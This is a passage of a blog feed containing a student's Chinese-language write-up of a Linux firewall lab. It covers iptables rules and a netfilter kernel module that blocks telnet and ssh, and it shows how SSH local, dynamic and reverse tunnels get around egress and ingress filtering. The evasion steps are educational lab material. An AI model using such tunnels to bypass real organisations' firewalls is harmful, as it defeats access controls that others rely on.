href="http://huyue.xn--6qq986b3xl/2019/08/01/VPN%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/#VPN%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86" target="_blank" rel="noopener">VPN工作原理</a></p><p>当我们上面步骤都做完之后，可以在client和server端分别看到以下内容</p><p><img src="/2020/12/02/Firewall-VPN/3-4.PNG" srcset="/img/loading.gif" alt="3-4"></p><p><img src="/2020/12/02/Firewall-VPN/3-5.PNG" srcset="/img/loading.gif" alt="3-5"></p><p>对数据包的分析</p><p><img src="/2020/12/02/Firewall-VPN/3-7.PNG" srcset="/img/loading.gif" alt="3-7"></p><p>在这里我们可以发现，首先，当发送数据包的时候，192.168.53.5其实也会向目标地址发送数据包，而10.0.2.5在这里其实相当于是扮演了VPN网关，所有的宝石加上是由10.0.2.5来进行传输出去的，而之后当收到这个包的时候，会转发到对应的192.168.53.5，之后对应的socket可以得到相应的数据</p><p>参考blog：<a href="https://cshihong.github.io/2019/05/11/SSL-VPN%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">SSL_VPN技术原理</a>以及NAT网络：</p><p><img src="/2020/12/02/Firewall-VPN/3-8.PNG" srcset="/img/loading.gif" alt="3-8"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Firewall-VPN&quot;&gt;&lt;a href=&quot;#Firewall-VPN&quot; class=&quot;headerlink&quot; title=&quot;Firewall_VPN&quot;&gt;&lt;/a&gt;Firewall_VPN&lt;/h1&gt;&lt;h2 id=&quot;Overview&quot;&gt;&lt;a href=&quot;#Overv</summary>
      
    
    
    
    
    <category term="Network Security" scheme="http://yoursite.com/tags/Network-Security/"/>
    
  </entry>
  
  <entry>
    <title>Linuc Firewall Exploration</title>
    <link href="http://yoursite.com/2020/11/30/Linuc-Firewall-Exploration/"/>
    <id>http://yoursite.com/2020/11/30/Linuc-Firewall-Exploration/</id>
    <published>2020-11-30T08:05:39.000Z</published>
    <updated>2020-12-01T13:22:55.611Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Firewall-Exploration"><a href="#Firewall-Exploration" class="headerlink" title="Firewall Exploration"></a>Firewall Exploration</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><blockquote><p>防火墙的本质是查看对应的会话表，根据会话表中不同的内容和规则对数据包采取不同的操作</p></blockquote><p>防火墙主要工作在网络层</p><p><a href="http://www.zsythink.net/archives/1199" target="_blank" rel="noopener">iptables详解</a></p><p><a href="http://www.zsythink.net/archives/tag/iptables/page/2/" target="_blank" rel="noopener">IPtables系列讲解</a></p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><h3 id="task1：使用防火墙"><a href="#task1：使用防火墙" class="headerlink" title="task1：使用防火墙"></a>task1：使用防火墙</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当我们对于链、规则以及表有了一个初始概念的时候就可以做了，这里面明显要进行的就是过滤，这里是在A上面进行的防火墙设置，所以此时明显要操作的是input和output链</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><ul><li><p>防止A（10.0.2.4）对B（10.0.2.5）进行telnet操作</p><p>  这时候在A的output链上面添加filter表规则（防火墙运行在A上面），输入命令</p></li></ul><pre><code class="hljs angelscript">sudo iptables -A OUTPUT -d <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.5</span> -j DROP</code></pre><p>之后查看对应的filter表的内容并且ping 10.0.2.5，会发现一直在trying，阻止telnet成功</p><ul><li><p>防止B对A进行telnet操作</p><p>  一样的道理，首先未设置防火墙规则的时候在B上telnet A（10.0.2.4），发现可以登录</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/1-4.PNG" srcset="/img/loading.gif" alt="1-4"></p><p>  之后在A上面设置INPUT链的filter表规则</p></li></ul><pre><code class="hljs angelscript">sudo iptables -A INPUT -s <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.5</span> -j DROP</code></pre><p>运行并查看filter表规则</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/1-5.PNG" srcset="/img/loading.gif" alt="1-5"></p><p>此时在B上进行telnet会发现无法连接上</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/1-6.PNG" srcset="/img/loading.gif" alt="1-6"></p><ul><li>阻止A对外部网站的访问</li></ul><p>以百度为例，百度对应的IP地址为182.61.200.6和182.61.200.7，将其添加到对应的OUTPUT链里面，在添加前可以正常访问百度</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/1-7.PNG" srcset="/img/loading.gif" alt="1-7"></p><p>运行以下命令</p><pre><code class="hljs angelscript">sudo iptables -A OUTPUT -d <span class="hljs-number">182.61</span><span class="hljs-number">.200</span><span class="hljs-number">.6</span> -j DROPsudo iptables -A OUTPUT -d <span class="hljs-number">182.61</span><span class="hljs-number">.200</span><span class="hljs-number">.7</span> -j DROP</code></pre><p>此时的filter表</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/1-8.PNG" srcset="/img/loading.gif" alt="1-8"></p><p>采取ping操作来访问，操作不被允许，访问失败</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/1-9.PNG" srcset="/img/loading.gif" alt="1-9"></p><h3 id="task2：实现一个简单的防火墙"><a href="#task2：实现一个简单的防火墙" class="headerlink" title="task2：实现一个简单的防火墙"></a>task2：实现一个简单的防火墙</h3><blockquote><p>LKM允许我们在运行期间给内核添加一个新的模块。这种新的模块使我们能扩展内核功能，而无需重建核心甚至是重启电脑。作为LKM中防火墙的包过滤部分是可以被实现的。然而，这还不够。为了使过滤模块能够阻止传入/传出的数据包，必须将模块插入到数据包处理路径中。</p><p>Netfilter旨在促进授权用户对数据包的操作。Netfilter通过在Linux内核中实现许多<em>hooks</em>来实现此目标。这些钩子被插入到多个地点，包括数据包流入与流出的路径。如果我们想操作流入的数据包，我们只需要连接我们的程序（在LKM内）到相应的钩子上即可。当一个流入数据包到达，我们的程序将被唤醒。我们的程序可以决定这个数据包是否该被阻止或是放行；此外，我们还可以在程序中修改数据包。</p><p>我们写了一个调用hook_func的函数，当满足nf_hook_ops条件的包出现时，它就会被调用。这个函数执行适当的逻辑，在我们的例子中就是丢弃数据包。我们填入nf_hook_ops结构，它定义了特定的Netfilter钩子到target target，它的优先级(如果你有多个钩子，这很重要)，并给目标包的类型(在本例中是IPV4)，并将hook_func绑定到它</p></blockquote><p>在这里除了task1之外新增了两个规则：阻止A到B的SSH连接以及阻止B到A的SSH连接</p><p>一定不要让自己的文件夹有空格！！！！！</p><h4 id="具体实现-1"><a href="#具体实现-1" class="headerlink" title="具体实现"></a>具体实现</h4><p>终于make成功了</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><p>之后加载模块，加载成功</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><p>并且确保此时的filter表为空</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p>之后开始测试</p><ul><li><p>首先是A（10.0.2.4）到B（10.0.2.5）的telnet和ssh测试，可以看到这些包都被drop掉了并且connection没有建立</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/2-4.PNG" srcset="/img/loading.gif" alt="2-4"></p></li><li><p>之后是B到A的telnet和ssh测试，可以看到后面六条记录记录了从B到A进行telnet和ssh操作时被drop掉的包</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/2-6.PNG" srcset="/img/loading.gif" alt="2-6"></p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/2-5.PNG" srcset="/img/loading.gif" alt="2-5"></p></li><li><p>最后是访问从A访问百度的测试，在浏览器上访问百度</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/2-7.PNG" srcset="/img/loading.gif" alt="2-7"></p></li></ul><p><strong>code</strong></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/kernel.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/module.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/netfilter.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/netfilter_ipv4.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/ip.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/tcp.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/inet.h&gt;</span></span><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> <span class="hljs-title">FilterHookRule_1</span>;</span><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> <span class="hljs-title">FilterHookRule_2</span>;</span><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> <span class="hljs-title">FilterHookRule_3</span>;</span><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> <span class="hljs-title">FilterHookRule_4</span>;</span><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> <span class="hljs-title">FilterHookRule_5</span>;</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">eq_daddr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct iphdr *iph, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *ip_addr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//check if the dst ip address equals the given address</span>    <span class="hljs-keyword">char</span> source[<span class="hljs-number">16</span>];    <span class="hljs-built_in">snprintf</span>(source, <span class="hljs-number">16</span>, <span class="hljs-string">"%pI4"</span>, &amp;iph-&gt;daddr);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(source, ip_addr) == <span class="hljs-number">0</span>)        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">eq_saddr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct iphdr *iph, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *ip_addr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//check if the src ip address equals the given address</span>    <span class="hljs-keyword">char</span> source[<span class="hljs-number">16</span>];    <span class="hljs-built_in">snprintf</span>(source, <span class="hljs-number">16</span>, <span class="hljs-string">"%pI4"</span>, &amp;iph-&gt;saddr);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(source, ip_addr) == <span class="hljs-number">0</span>)        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">Filter_1</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * priv, struct sk_buff * skb, <span class="hljs-keyword">const</span>  struct nf_hook_state * state)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//考虑task1.1规则的实现，防止AtelnetB</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span>;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcphdr</span> *<span class="hljs-title">tcph</span>;</span>    iph = ip_hdr(skb);    tcph = (<span class="hljs-keyword">void</span> *)iph + iph-&gt;ihl * <span class="hljs-number">4</span>;    <span class="hljs-keyword">if</span> (iph-&gt;protocol == IPPROTO_TCP &amp;&amp; tcph-&gt;dest == htons(<span class="hljs-number">23</span>) &amp;&amp; eq_daddr(iph, <span class="hljs-string">"10.0.2.5"</span>) &amp;&amp; eq_saddr(iph, <span class="hljs-string">"10.0.2.4"</span>))    &#123;        printk(KERN_INFO <span class="hljs-string">"Dropping telnet from %pI4 packet to %pI4\n"</span>, &amp;iph-&gt;saddr, &amp;iph-&gt;daddr);        <span class="hljs-keyword">return</span> NF_DROP;    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-keyword">return</span> NF_ACCEPT;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">Filter_2</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * priv, struct sk_buff * skb, <span class="hljs-keyword">const</span>  struct nf_hook_state * state)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//考虑task1.2规则的实现，防止BtelnetA</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span>;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcphdr</span> *<span class="hljs-title">tcph</span>;</span>    iph = ip_hdr(skb);    tcph = (<span class="hljs-keyword">void</span> *)iph + iph-&gt;ihl * <span class="hljs-number">4</span>;    <span class="hljs-keyword">if</span> (iph-&gt;protocol == IPPROTO_TCP &amp;&amp; tcph-&gt;dest == htons(<span class="hljs-number">23</span>) &amp;&amp; eq_daddr(iph, <span class="hljs-string">"10.0.2.4"</span>) &amp;&amp; eq_saddr(iph, <span class="hljs-string">"10.0.2.5"</span>))    &#123;        printk(KERN_INFO <span class="hljs-string">"Dropping telnet from %pI4 packet to %pI4\n"</span>, &amp;iph-&gt;saddr, &amp;iph-&gt;daddr);        <span class="hljs-keyword">return</span> NF_DROP;    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-keyword">return</span> NF_ACCEPT;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">Filter_3</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * priv, struct sk_buff * skb, <span class="hljs-keyword">const</span>  struct nf_hook_state * state)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//考虑task1.3规则的实现，防止A访问外部网站,比如百度</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span>;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcphdr</span> *<span class="hljs-title">tcph</span>;</span>    iph = ip_hdr(skb);    tcph = (<span class="hljs-keyword">void</span> *)iph + iph-&gt;ihl * <span class="hljs-number">4</span>;    <span class="hljs-keyword">if</span> (iph-&gt;protocol == IPPROTO_TCP &amp;&amp; (tcph-&gt;dest == htons(<span class="hljs-number">80</span>) || tcph-&gt;dest == htons(<span class="hljs-number">443</span>)) &amp;&amp; (eq_daddr(iph, <span class="hljs-string">"180.101.49.11"</span>) || eq_daddr(iph, <span class="hljs-string">"180.101.49.12"</span>)) &amp;&amp; eq_saddr(iph, <span class="hljs-string">"10.0.2.4"</span>))    &#123;        printk(KERN_INFO <span class="hljs-string">"Dropping web packet from %pI4 packet to %pI4\n"</span>, &amp;iph-&gt;saddr, &amp;iph-&gt;daddr);        <span class="hljs-keyword">return</span> NF_DROP;    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-keyword">return</span> NF_ACCEPT;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">Filter_4</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * priv, struct sk_buff * skb, <span class="hljs-keyword">const</span>  struct nf_hook_state * state)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//新规则的实现，防止B ssh A</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span>;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcphdr</span> *<span class="hljs-title">tcph</span>;</span>    iph = ip_hdr(skb);    tcph = (<span class="hljs-keyword">void</span> *)iph + iph-&gt;ihl * <span class="hljs-number">4</span>;    <span class="hljs-keyword">if</span> (iph-&gt;protocol == IPPROTO_TCP &amp;&amp; tcph-&gt;dest == htons(<span class="hljs-number">22</span>) &amp;&amp; eq_daddr(iph, <span class="hljs-string">"10.0.2.4"</span>) &amp;&amp; eq_saddr(iph, <span class="hljs-string">"10.0.2.5"</span>))    &#123;        printk(KERN_INFO <span class="hljs-string">"Dropping ssh from %pI4 packet to %pI4\n"</span>, &amp;iph-&gt;saddr, &amp;iph-&gt;daddr);        <span class="hljs-keyword">return</span> NF_DROP;    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-keyword">return</span> NF_ACCEPT;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">Filter_5</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * priv, struct sk_buff * skb, <span class="hljs-keyword">const</span>  struct nf_hook_state * state)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//新规则的实现，防止A ssh B</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span>;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcphdr</span> *<span class="hljs-title">tcph</span>;</span>    iph = ip_hdr(skb);    tcph = (<span class="hljs-keyword">void</span> *)iph + iph-&gt;ihl * <span class="hljs-number">4</span>;    <span class="hljs-keyword">if</span> (iph-&gt;protocol == IPPROTO_TCP &amp;&amp; tcph-&gt;dest == htons(<span class="hljs-number">22</span>) &amp;&amp; eq_daddr(iph, <span class="hljs-string">"10.0.2.5"</span>) &amp;&amp; eq_saddr(iph, <span class="hljs-string">"10.0.2.4"</span>))    &#123;        printk(KERN_INFO <span class="hljs-string">"Dropping ssh from %pI4 packet to %pI4\n"</span>, &amp;iph-&gt;saddr, &amp;iph-&gt;daddr);        <span class="hljs-keyword">return</span> NF_DROP;    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-keyword">return</span> NF_ACCEPT;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">setUpFilter</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    printk(KERN_INFO <span class="hljs-string">"Registering filters.\n"</span>);    FilterHookRule_1.hook = Filter_1;        <span class="hljs-comment">//对应的function</span>    FilterHookRule_1.hooknum = NF_INET_LOCAL_OUT;  <span class="hljs-comment">//对应OUTPUT链</span>    FilterHookRule_1.pf = PF_INET;    FilterHookRule_1.priority = NF_IP_PRI_FIRST;   <span class="hljs-comment">//优先级</span>    nf_register_hook(&amp;FilterHookRule_1);    FilterHookRule_2.hook = Filter_2;        <span class="hljs-comment">//对应的function</span>    FilterHookRule_2.hooknum = NF_INET_LOCAL_IN;  <span class="hljs-comment">//对应input链</span>    FilterHookRule_2.pf = PF_INET;    FilterHookRule_2.priority = NF_IP_PRI_FIRST;   <span class="hljs-comment">//优先级</span>    nf_register_hook(&amp;FilterHookRule_2);    FilterHookRule_3.hook = Filter_3;        <span class="hljs-comment">//对应的function</span>    FilterHookRule_3.hooknum = NF_INET_LOCAL_OUT;  <span class="hljs-comment">//对应OUTPUT链</span>    FilterHookRule_3.pf = PF_INET;    FilterHookRule_3.priority = NF_IP_PRI_FIRST;   <span class="hljs-comment">//优先级</span>    nf_register_hook(&amp;FilterHookRule_3);    FilterHookRule_4.hook = Filter_4;        <span class="hljs-comment">//对应的function</span>    FilterHookRule_4.hooknum = NF_INET_LOCAL_IN;  <span class="hljs-comment">//对应INPUT链</span>    FilterHookRule_4.pf = PF_INET;    FilterHookRule_4.priority = NF_IP_PRI_FIRST;   <span class="hljs-comment">//优先级</span>    nf_register_hook(&amp;FilterHookRule_4);    FilterHookRule_5.hook = Filter_5;        <span class="hljs-comment">//对应的function</span>    FilterHookRule_5.hooknum = NF_INET_LOCAL_OUT;  <span class="hljs-comment">//对应OUTPUT链</span>    FilterHookRule_5.pf = PF_INET;    FilterHookRule_5.priority = NF_IP_PRI_FIRST;   <span class="hljs-comment">//优先级</span>    nf_register_hook(&amp;FilterHookRule_5);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">removeFilter</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    nf_unregister_hook(&amp;FilterHookRule_1);    nf_unregister_hook(&amp;FilterHookRule_2);    nf_unregister_hook(&amp;FilterHookRule_3);    nf_unregister_hook(&amp;FilterHookRule_4);    nf_unregister_hook(&amp;FilterHookRule_5);&#125;module_init(setUpFilter);module_exit(removeFilter);MODULE_LICENSE(<span class="hljs-string">"GPL"</span>);</code></pre><h4 id="task2复盘"><a href="#task2复盘" class="headerlink" title="task2复盘"></a>task2复盘</h4><p>文件夹命名尽量不要带空格，makefile哭泣</p><p>其实这个task的思路还是比较简单的，本质上来讲就是当满足对应的条件（匹配条件if）的时候，来完成相应的东作用（drop）。其实是引入的比较新的东西的话也就是LKM和netfilter的与挂钩点register的东西，不存在理解上面的难点</p><h3 id="task3：规避出口过滤"><a href="#task3：规避出口过滤" class="headerlink" title="task3：规避出口过滤"></a>task3：规避出口过滤</h3><h4 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h4><blockquote><p>we show how such egress filtering can be bypassed using the tunnel mechanism. There are many ways to establish tunnels; in this task, we only focus on SSH tunnels.</p></blockquote><h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h4><h5 id="设置iptables来屏蔽对应的telnet连接和发往www-fudan-edu-cn主机的数据包"><a href="#设置iptables来屏蔽对应的telnet连接和发往www-fudan-edu-cn主机的数据包" class="headerlink" title="设置iptables来屏蔽对应的telnet连接和发往www.fudan.edu.cn主机的数据包"></a>设置iptables来屏蔽对应的telnet连接和发往<a href="http://www.fudan.edu.cn主机的数据包" target="_blank" rel="noopener">www.fudan.edu.cn主机的数据包</a></h5><p>首先，查看现在的filter表并且查询<a href="http://www.fudan.edu.cn的IP地址，发现是202.120.224.81" target="_blank" rel="noopener">www.fudan.edu.cn的IP地址，发现是202.120.224.81</a></p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><p>之后运行下面两条命令</p><pre><code class="hljs angelscript">sudo iptables -A OUTPUT -s <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.4</span> -p tcp --dport <span class="hljs-number">23</span> -j DROPsudo iptables -A OUTPUT -s <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.4</span> -d <span class="hljs-number">202.120</span><span class="hljs-number">.224</span><span class="hljs-number">.81</span> -j DROP</code></pre><p>之后查看filter表</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-3.PNG" srcset="/img/loading.gif" alt="3-3"></p><h5 id="task3-a：建立穿过防火墙的隧道"><a href="#task3-a：建立穿过防火墙的隧道" class="headerlink" title="task3.a：建立穿过防火墙的隧道"></a>task3.a：建立穿过防火墙的隧道</h5><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-4.PNG" srcset="/img/loading.gif" alt="3-4"></p><p>在这个task里面，我只采用了两个VM来实现，首先，当我们直接telnet B（10.0.2.5）的时候，会发现不能成功</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-5.PNG" srcset="/img/loading.gif" alt="3-5"></p><p>之后运行下面的命令来建立A（端口为8000）和B（端口22）之间的ssh连接，并且设置B转发到本机的23端口</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-6.PNG" srcset="/img/loading.gif" alt="3-6"></p><p>这时候已经建立好了ssh连接，当A上面从端口8000发送过去的数据包到达B的22端口的时候，B会转发到23端口，所以之后我们在主机A上面运行telnet localhost 8000的时候，从本质上来讲，是在将端口与localhost 8000发送TCP包来建立telnet连接，但是之后端口8000收到TCP数据包之后并不用来建立telnet连接，而是利用ssh隧道来实现转发，这时候wireshark抓包可以看见，并没有telnet数据包，而是ssh数据包</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-7.PNG" srcset="/img/loading.gif" alt="3-7"></p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-9.PNG" srcset="/img/loading.gif" alt="3-9"></p><h5 id="task3-b：通过ssh隧道来访问外部网站（以www-fudan-edu-cn为例）"><a href="#task3-b：通过ssh隧道来访问外部网站（以www-fudan-edu-cn为例）" class="headerlink" title="task3.b：通过ssh隧道来访问外部网站（以www.fudan.edu.cn为例）"></a>task3.b：通过ssh隧道来访问外部网站（以<a href="http://www.fudan.edu.cn为例）" target="_blank" rel="noopener">www.fudan.edu.cn为例）</a></h5><p>使用了<strong>动态端口转发</strong>：当数据包到达VM B的时候，并不是静态的转发到目的地IP，而是根据包的信息来决定目的地</p><ul><li><p>将本地端口9000与B主机22端口建立ssh隧道</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/3-10.PNG" srcset="/img/loading.gif" alt="3-10"></p><p>  此时本地端口与B主机的22端口已经建立好了连接，之后就是浏览器与本地9000的连接的建立</p></li><li><p>建立浏览器连接</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/3-11.PNG" srcset="/img/loading.gif" alt="3-11"></p></li><li><p>访问以及抓包观察</p><p>  我们可以看到，访问<a href="http://www.fudan.edu.cn成功，并且通过抓数据包可以看到并不是通过10.0.2.4来直接进行访问202.120.224.81的，而是通过ssh连接来让B进行访问" target="_blank" rel="noopener">www.fudan.edu.cn成功，并且通过抓数据包可以看到并不是通过10.0.2.4来直接进行访问202.120.224.81的，而是通过ssh连接来让B进行访问</a></p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/3-13.PNG" srcset="/img/loading.gif" alt="3-13"></p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/3-12.PNG" srcset="/img/loading.gif" alt="3-12"></p><p>  同时，当经过ssh隧道，由于并不在是直接访问对应IP，而是通过ssh连接来访问，所以绕过了防火墙，同时我们结合上面的图来一起分析，可以看到A到B是通过ssh，而B到对应的web服务器是通过http连接</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/3-14.PNG" srcset="/img/loading.gif" alt="3-14"></p><p>  之后断开ssh连接并且清除缓存，此时发现代理拒绝连接</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/3-15.PNG" srcset="/img/loading.gif" alt="3-15"></p><p>  之后当我们重新家里ssh隧道之后，我们又可以看到对应界面，就和之前访问成功的时候一样</p></li></ul><h3 id="task4：规避进入过滤"><a href="#task4：规避进入过滤" class="headerlink" title="task4：规避进入过滤"></a>task4：规避进入过滤</h3><p>首先是要进行访问的内部网络的网络页面</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/4-1.PNG" srcset="/img/loading.gif" alt="4-1"></p><p>下面是要输入的防火墙的INPUT里面的规则以及此时防火墙filter表中的规则</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/4-2.PNG" srcset="/img/loading.gif" alt="4-2"></p><p>之后我们无法通过建立ssh连接以及http进行访问，因为这时候从外部进行访问的ssh连接也被屏蔽掉了，之后我们需要建立一个reverse连接，原理是此时并不制止从内部发往外部的ssh连接，我们建立了反向ssh隧道</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/4-3.PNG" srcset="/img/loading.gif" alt="4-3"></p><p>此时A的80端口已经与远程端的8000端口建立了连接，并且进行转发的主机是10.0.2.5</p><p>之后可以看到，成功访问</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/4-4.PNG" srcset="/img/loading.gif" alt="4-4"></p><p>原理示意图：</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/4-5.PNG" srcset="/img/loading.gif" alt="4-5"></p><p>参考blog：<a href="https://github.com/li-xin-yi/seedlab/tree/master/Firewall-Exploration" target="_blank" rel="noopener">reverse ssh在最后</a>、<a href="https://unix.stackexchange.com/questions/46235/how-does-reverse-ssh-tunneling-work" target="_blank" rel="noopener">how does the reverse tunnel work</a></p><h2 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h2><p>这个lab给我的感觉就是太过于狭小、太偏向于技术层面而失去了对于整体系统的把握，虽然能够对于iptables这一种防火墙有所了解，但是对于所有的防火墙的认知还是有一点匮乏，其中task3和task4有比较好的理解，task2其实感觉就是task1的一种具体实现</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Firewall-Exploration&quot;&gt;&lt;a href=&quot;#Firewall-Exploration&quot; class=&quot;headerlink&quot; title=&quot;Firewall Exploration&quot;&gt;&lt;/a&gt;Firewall Exploration&lt;/h1&gt;&lt;</summary>
      
    
    
